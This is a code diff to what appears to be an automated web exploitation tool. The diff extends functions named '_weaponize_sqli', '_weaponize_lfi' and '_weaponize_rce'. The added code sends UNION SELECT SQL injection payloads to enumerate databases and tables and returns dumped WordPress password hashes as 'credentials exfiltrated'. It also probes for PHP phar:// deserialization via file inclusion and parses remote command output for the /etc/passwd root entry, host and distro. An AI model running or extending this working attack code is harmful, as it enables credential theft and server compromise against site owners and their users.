@@ -211,12 +211,55 @@ def _weaponize_sqli(boot, res, step_fn) -> dict:
 
     if found_users:
         _step(step_fn, f"wp_users dump SUCCESS: {len(found_users)} credential(s) extracted")
+        # Enrich: DB name + table list via UNION SELECT on information_schema
+        _db_meta: dict = {}
+        try:
+            for _cc in range(2, 7):
+                _cols = ["NULL"] * _cc
+                _cols[0] = "database()"
+                _ep_db = dict(base_params)
+                _ep_db[param] = f"' UNION SELECT {','.join(_cols)}-- -"
+                _rd = _send(boot, method, endpoint,
+                            params=_ep_db if method.upper() == "GET" else None,
+                            data=_ep_db if method.upper() != "GET" else None)
+                if _rd and _rd.status_code == 200:
+                    _db_m = re.search(r'\b([a-z0-9_]{2,40})\b', _rd.text or "", re.IGNORECASE)
+                    if _db_m and _db_m.group(1) not in ("null", "NULL", "1", "0"):
+                        _db_meta["database"] = _db_m.group(1)
+                        break
+            # Table enumeration from information_schema
+            for _cc in range(2, 7):
+                _cols = ["NULL"] * _cc
+                _cols[0] = "table_name"
+                _ep_tbl = dict(base_params)
+                _ep_tbl[param] = (
+                    f"' UNION SELECT {','.join(_cols)} FROM information_schema.tables "
+                    f"WHERE table_schema=database() LIMIT 5-- -"
+                )
+                _rt = _send(boot, method, endpoint,
+                            params=_ep_tbl if method.upper() == "GET" else None,
+                            data=_ep_tbl if method.upper() != "GET" else None)
+                if _rt and _rt.status_code == 200:
+                    _tbl_names = re.findall(r'\b(wp_[a-z_]+|[a-z][a-z0-9_]{3,30})\b',
+                                            _rt.text or "")
+                    _uniq_tbls = list(dict.fromkeys(
+                        t for t in _tbl_names
+                        if t not in ("null", "NULL", "table", "schema", "name")))[:8]
+                    if _uniq_tbls:
+                        _db_meta["tables"] = _uniq_tbls
+                        break
+        except Exception:
+            pass
         return {
             "technique": "sqli_dump",
-            "data": {"wp_users": found_users[:5]},
+            "data": {"wp_users": found_users[:5], "db_enumeration": _db_meta},
+            "db_enumeration": _db_meta,
+            "user_hashes": [u.get("user_pass", "") for u in found_users[:3]],
             "impact": (f"Admin credentials exfiltrated: "
                        f"{', '.join(u['user_login'] for u in found_users[:3])} — "
-                       f"hash type: {'phpass ($P$)' if any('$P$' in u.get('user_pass','') for u in found_users) else 'unknown'}"),
+                       f"hash type: {'phpass ($P$)' if any('$P$' in u.get('user_pass','') for u in found_users) else 'unknown'}"
+                       + (f" | DB: {_db_meta.get('database','')} tables: {_db_meta.get('tables',[])[:4]}"
+                          if _db_meta else "")),
         }
     # --- Strategy 3: Generic user table dump (non-WP targets) ---
     # Enumerate user-like tables via information_schema, then dump email/password columns
@@ -433,6 +476,31 @@ def _weaponize_lfi(boot, res, step_fn) -> dict:
                            f"{', '.join(list(_extracted.keys())[:3]) if _extracted else 'credentials present'}"),
             }
 
+    # --- phar:// probe: best-effort check for PHP phar deserialization surface ---
+    # phar:// can trigger PHP object deserialization if the app reads user-supplied paths.
+    # We probe a benign phar path; a non-404/500 response indicates PHP processes it,
+    # which is a signal worth flagging for manual follow-up.
+    if endpoint and param:
+        try:
+            _phar_payload = "phar:///tmp/binoracle_test.phar/test.txt"
+            _pp = {param: _phar_payload}
+            _rp = _send(boot, method, endpoint,
+                        params=_pp if method.upper() == "GET" else None,
+                        data=_pp if method.upper() != "GET" else None)
+            if _rp is not None and _rp.status_code not in (400, 404, 500):
+                _step(step_fn, f"phar:// probe → HTTP {_rp.status_code} (not blocked — potential deserialization surface)")
+                return {
+                    "technique": "lfi_phar_surface",
+                    "data": {"phar_payload": _phar_payload,
+                             "response_code": _rp.status_code,
+                             "body_snippet": (_rp.text or "")[:200]},
+                    "phar_tested": True,
+                    "impact": (f"phar:// not blocked (HTTP {_rp.status_code}) — "
+                               f"potential PHP object deserialization surface via LFI"),
+                }
+        except Exception:
+            pass
+
     _step(step_fn, "LFI weaponization: no sensitive config extracted")
     return {
         "technique": "lfi_config",
@@ -492,11 +560,36 @@ def _weaponize_rce(boot, res, step_fn) -> dict:
             break
 
     if output_data:
+        # Build structured os_fingerprint dict from individual commands
+        _os_fp: dict = {}
+        _raw = output_data.get("raw_output", "")
+        if output_data.get("user"):
+            _os_fp["user"] = output_data["user"]
+        if output_data.get("uname"):
+            _os_fp["uname"] = output_data["uname"]
+        if output_data.get("hostname"):
+            _os_fp["hostname"] = output_data["hostname"]
+        # Try to extract /etc/passwd first line (root:x:0:0:...)
+        _passwd_m = re.search(r'(root:[^:\n]+:[^:\n]+:[^:\n]+:[^:\n]+:[^:\n]+:[^\n]+)', _raw)
+        if _passwd_m:
+            _os_fp["passwd_root"] = _passwd_m.group(1)[:120]
+        # Try to extract distro from os-release output
+        _distro_m = re.search(r'PRETTY_NAME="([^"]+)"', _raw)
+        if _distro_m:
+            _os_fp["distro"] = _distro_m.group(1)
+        # Try to extract webroot file listing
+        _ls_m = re.findall(r'(wp-(?:config|content|includes|admin)[^\s<"&]*)', _raw)
+        if _ls_m:
+            _os_fp["webroot_files"] = list(dict.fromkeys(_ls_m))[:5]
+        output_data["os_fingerprint"] = _os_fp
         return {
             "technique": "rce_fingerprint",
             "data": output_data,
+            "os_fingerprint": _os_fp,
+            "rce_command_output": _raw[:500],
             "impact": (f"OS command execution confirmed as {output_data.get('user','www-data')} "
-                       f"on host {output_data.get('hostname','unknown')}"),
+                       f"on host {output_data.get('hostname','unknown')}"
+                       + (f" ({_os_fp['distro']})" if _os_fp.get('distro') else "")),
         }
     _step(step_fn, "RCE fingerprint: command output not parseable from response")
     return {
